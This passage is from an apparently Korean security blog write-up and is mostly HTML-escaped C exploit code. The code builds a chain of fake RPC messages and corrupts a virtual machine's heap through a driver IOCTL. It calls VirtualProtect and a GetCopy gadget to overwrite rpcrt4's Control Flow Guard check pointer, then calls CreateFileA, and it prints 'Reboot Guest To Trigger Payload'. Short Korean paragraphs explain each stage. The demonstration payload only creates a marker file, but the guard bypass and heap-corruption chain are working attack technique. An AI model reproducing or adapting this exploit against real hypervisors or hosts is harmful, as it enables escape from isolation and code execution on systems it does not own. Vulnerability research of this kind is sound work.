	pRpcMsg = payload + i * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
	pRpcMsg-&amp;gt;Buffer = start + i * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;;
	pRpcMsg-&amp;gt;ProcNum = i;
	pRpcMsg-&amp;gt;RpcInterfaceInformation = ServerInterface;
	pRpcMsg-&amp;gt;DataRepresentation = &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
	FmtStringOffset[i] = ProcStringCursor;

	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Node[%x]: address=%llx, vftable=%llx, Buffer=%llx, RPC_SERVER_INTERFACE=%llx, next=%llx\n&amp;quot;&lt;/span&gt;, i, start+i*&lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;, vftable, start+i*&lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;, ServerInterface, start + (i+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)*&lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt;);

	ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x1&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//HandleType = 0x1&lt;/span&gt;
	ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//InterpreterFlags = 0&lt;/span&gt;
	*(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;// return value == 0&lt;/span&gt;
	&lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; (i) {&lt;span class=&#34;hljs-comment&#34;&gt;//i=&amp;gt;ProcNum,  StackSize = BufferLength, Buffer + Bufferlen =&amp;gt; ProcDesc&lt;/span&gt;
	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-comment&#34;&gt;//VirtualProtect(RPCRT4!_guard_check_icall_fptr, 8, PAGE_READWRITE, VALID_ADDRESS)&lt;/span&gt;
		*(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//StackSize &amp;lt;- Buffer Length&lt;/span&gt;
		pRpcMsg-&amp;gt;BufferLength = &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;;
		&lt;span class=&#34;hljs-comment&#34;&gt;//*(__int64*)&amp;amp;ProcString[0x10 * i + 6] = start + i * 0x100 + 0x60 + 0x20 + 0x10;//0x20 -&amp;gt; bufferlen, ProcDesc Pointer&lt;/span&gt;
		&lt;span class=&#34;hljs-comment&#34;&gt;//ProcDesc = &amp;amp;pRpcMsg-&amp;gt;Buffer + 0x30;//after ProcDescPointer&lt;/span&gt;
		ProcDesc = &amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ignore return value&lt;/span&gt;
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = pRpcMsg-&amp;gt;BufferLength/&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//NumberParams&lt;/span&gt;
		Param = ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;
		ProcStringCursor += &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ProcString + ProcDesc len&lt;/span&gt;
		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;

	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;span class=&#34;hljs-comment&#34;&gt;//GetCopy(this, dest)&lt;/span&gt;
		*(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//StackSize &amp;lt;- Buffer Length&lt;/span&gt;
		pRpcMsg-&amp;gt;BufferLength = &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
		ProcDesc = &amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ignore return value&lt;/span&gt;
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = pRpcMsg-&amp;gt;BufferLength/&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//NumberParams&lt;/span&gt;
		Param = ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;
		ProcStringCursor += &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ProcString + ProcDesc len&lt;/span&gt;
		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;

	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-comment&#34;&gt;//CreateFileA&lt;/span&gt;
		*(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//StackSize &amp;lt;- Buffer Length&lt;/span&gt;
		pRpcMsg-&amp;gt;BufferLength = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;;
		ProcDesc = &amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ignore return value&lt;/span&gt;
		ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = pRpcMsg-&amp;gt;BufferLength/&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//NumberParams&lt;/span&gt;
		Param = ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;
		ProcStringCursor += &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//ProcString + ProcDesc len&lt;/span&gt;
		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;

	&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;:
		&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
	}
	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (Param &amp;amp;&amp;amp; ProcDesc &amp;amp;&amp;amp; pRpcMsg-&amp;gt;BufferLength) {&lt;span class=&#34;hljs-comment&#34;&gt;//ProcDesc is Not NULL and StackSize is bigger than 0 =&amp;gt; have parameter&lt;/span&gt;
		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\t[+] Param Info: Num of param=%d, StackSize=0x%x, \n&amp;quot;&lt;/span&gt;, ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;], pRpcMsg-&amp;gt;BufferLength);
		*(__int64*)&amp;amp;ProcDesc[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = (__int64)pRpcMsg-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt; + *(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt; * i + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;];&lt;span class=&#34;hljs-comment&#34;&gt;//address of buffer + bufferlen+ ProcDescLen&lt;/span&gt;
		&lt;span class=&#34;hljs-comment&#34;&gt;//Param = (char*)&amp;amp;(pRpcMsg-&amp;gt;Buffer) + 0x20 + *(short*)&amp;amp;ProcString[0x10 * i + 4];&lt;/span&gt;
		&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; j = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; j &amp;lt; pRpcMsg-&amp;gt;BufferLength / &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;; j++) {
			Param[j * &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//flag, used in Unmarshaling&lt;/span&gt;
			Param[j * &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = j * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//Stack Index of parameter&lt;/span&gt;
			Param[j * &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//Size of Param&lt;/span&gt;
			ProcStringCursor += &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//add params len&lt;/span&gt;
		}
	}
	&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\t[+] Param Info: No param\n&amp;quot;&lt;/span&gt;);

}&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;RPC-Structures&#34;&gt;&lt;a href=&#34;#RPC-Structures&#34; class=&#34;headerlink&#34; title=&#34;RPC Structures&#34;&gt;&lt;/a&gt;RPC Structures&lt;/h3&gt;&lt;p&gt;&lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; RPC &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB4E4;&amp;#xC744; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xC0C1;&amp;#xC5D0;&amp;#xC11C; &amp;#xB178;&amp;#xB4DC;&amp;#xBCF4;&amp;#xB2E4; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C; &amp;#xB8E8;&amp;#xD504;&amp;#xB97C; &amp;#xC2DC;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &lt;code&gt;_listChanges&lt;/code&gt;&amp;#xB97C; 1&amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xB178;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &lt;code&gt;_LIST_ENTRY&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;pRpcMsg = payload;
pRpcMsg-&amp;gt;Buffer = (__int64)pRpcMsg-&amp;gt;Buffer | (&lt;span class=&#34;hljs-number&#34;&gt;0x7&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;// for vm::onprepare&amp;apos;s error check&lt;/span&gt;
VideoDirtListenerOffset[&lt;span class=&#34;hljs-number&#34;&gt;0xb8&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;] = start + &lt;span class=&#34;hljs-number&#34;&gt;0x150&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//init _listChanges&lt;/span&gt;
node = payload + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//last indirect call loop&lt;/span&gt;
node[&lt;span class=&#34;hljs-number&#34;&gt;0x58&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = start + &lt;span class=&#34;hljs-number&#34;&gt;0xb0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//escape loop&lt;/span&gt;


&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* trailer = payload + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; * INDIRECT_CALL_CHAIN_LEN;
__int64* indirectCallTable = trailer, * buffer = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
MIDL_STUB_DESC *pDesc = (PMIDL_STUB_DESC) (indirectCallTable + INDIRECT_CALL_CHAIN_LEN);



pDesc-&amp;gt;pMallocFreeStruct = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
pDesc-&amp;gt;Version = &lt;span class=&#34;hljs-number&#34;&gt;0xb000&lt;/span&gt;;

pMidl = (PMIDL_SERVER_INFO)(pDesc + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
pMidl-&amp;gt;DispatchTable = DispatchTable;
pMidl-&amp;gt;ProcString = ProcStringAddress;&lt;span class=&#34;hljs-comment&#34;&gt;//vaild address&lt;/span&gt;
pMidl-&amp;gt;FmtStringOffset = FmtStringOffsetAddress;&lt;span class=&#34;hljs-comment&#34;&gt;//vaild address&lt;/span&gt;
pMidl-&amp;gt;pStubDesc = MidlStubDesc;&lt;span class=&#34;hljs-comment&#34;&gt;//vaild address&lt;/span&gt;
pMidl-&amp;gt;ThunkTable = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

pServerInterface = (PRPC_SERVER_INTERFACE)(pMidl + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
pServerInterface-&amp;gt;InterpreterInfo = MidlSrvInfo;
pServerInterface-&amp;gt;Flags = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//to avoid NdrStubCall2 line 354&amp;apos;s branch&lt;/span&gt;

&lt;span class=&#34;hljs-built_in&#34;&gt;memcpy&lt;/span&gt;(payload + (vftable - VideoDirtListener), VideoDirtListenerEntries, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; * ENTRY_LEN);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Setting-Arguments&#34;&gt;&lt;a href=&#34;#Setting-Arguments&#34; class=&#34;headerlink&#34; title=&#34;Setting Arguments&#34;&gt;&lt;/a&gt;Setting Arguments&lt;/h3&gt;&lt;p&gt;&lt;code&gt;DispatchTable&lt;/code&gt;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xB178;&amp;#xB4DC; &amp;#xBCC4;&amp;#xB85C; &amp;#xBC84;&amp;#xD37C;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;



&lt;span class=&#34;hljs-comment&#34;&gt;//avoid Exception NdrStubCall2 &amp;amp; NdrpServerUnmarshal&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;//NdrStubCall2 line 417&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;//NdrpServerUnMarshal line 411&lt;/span&gt;
indirectCallTable[&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;] = KernelBase_VirtualProtect;

&lt;span class=&#34;hljs-comment&#34;&gt;//call VirtualProtect(rpcrt4!_guard_check_icall_fptr, 0x8, 0x4, `some writable address`);&lt;/span&gt;
indirectCallTable[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = KernelBase_VirtualProtect;

node = payload + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
pRpcMsg = node;
pRpcMsg-&amp;gt;ManagerEpv = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
pRpcMsg-&amp;gt;RpcFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x10000000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x20000000&lt;/span&gt;;
buffer = node + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = rpcrt4_guard_check_icall_fptr;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = pRpcMsg-&amp;gt;Buffer;

&lt;span class=&#34;hljs-comment&#34;&gt;//call GetCopy&lt;/span&gt;
indirectCallTable[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = combase + &lt;span class=&#34;hljs-number&#34;&gt;0xd9100&lt;/span&gt;;
node = payload + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
pRpcMsg = node;
pRpcMsg-&amp;gt;ManagerEpv = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
pRpcMsg-&amp;gt;RpcFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x10000000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x20000000&lt;/span&gt;;
buffer = node + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)pRpcMsg-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//this&lt;/span&gt;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = rpcrt4_guard_check_icall_fptr;&lt;span class=&#34;hljs-comment&#34;&gt;//dest&lt;/span&gt;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = ret;
&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* pThis = &amp;amp;buffer[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;];
*(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;*)&amp;amp;pThis[&lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
*(__int64*)&amp;amp;pThis[&lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)pRpcMsg-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;


&lt;span class=&#34;hljs-comment&#34;&gt;//call CreateFileA&lt;/span&gt;
indirectCallTable[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = KernelBase + &lt;span class=&#34;hljs-number&#34;&gt;0x41700&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//CreateFileA&lt;/span&gt;
node = payload + &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
pRpcMsg = node;
pRpcMsg-&amp;gt;ManagerEpv = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
pRpcMsg-&amp;gt;RpcFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x10000000&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x20000000&lt;/span&gt;;
buffer = node + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)pRpcMsg-&amp;gt;Buffer + &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//file name&lt;/span&gt;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = GENERIC_READ | GENERIC_WRITE;&lt;span class=&#34;hljs-comment&#34;&gt;//desired access&lt;/span&gt;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = CREATE_ALWAYS;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;] = FILE_ATTRIBUTE_NORMAL;
buffer[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
&lt;span class=&#34;hljs-built_in&#34;&gt;memcpy&lt;/span&gt;(&amp;amp;buffer[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;], &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;C:\\Users\\Public\\Hackyboiz\0&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;);


WriteInfo writeInfo = { &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, };

&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Offset Between FindVdl Buffer start and VideoDirtListener: %llx\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset - (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)FindVdl.buffer);

writeInfo.from = FindVdl.from + ((&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset - (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)FindVdl.buffer);

writeInfo.from -= writeInfo.from % &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;;

writeInfo.to = writeInfo.from + &lt;span class=&#34;hljs-number&#34;&gt;0x800&lt;/span&gt;;
&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] FindVdl Buffer (%p~)\n[+] VideoDirtListener ptr: %p\n[+] Write from %x to %x\n&amp;quot;&lt;/span&gt;, FindVdl.buffer, VideoDirtListenerOffset, writeInfo.from, writeInfo.to);

writeInfo.buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)FindVdl.buffer + (writeInfo.from - FindVdl.from);

&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Write Payload on TargetHeap\n&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Overwrite Range: Landpoint+0x%x ~ Landpoint+0x%x\n&amp;quot;&lt;/span&gt;, writeInfo.from, writeInfo.to);
DeviceIoControl(driver, CORRUPT_IOCTL, &amp;amp;writeInfo, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(WriteInfo), &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Payload is Ready, Reboot Guest To Trigger Payload\n&amp;quot;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
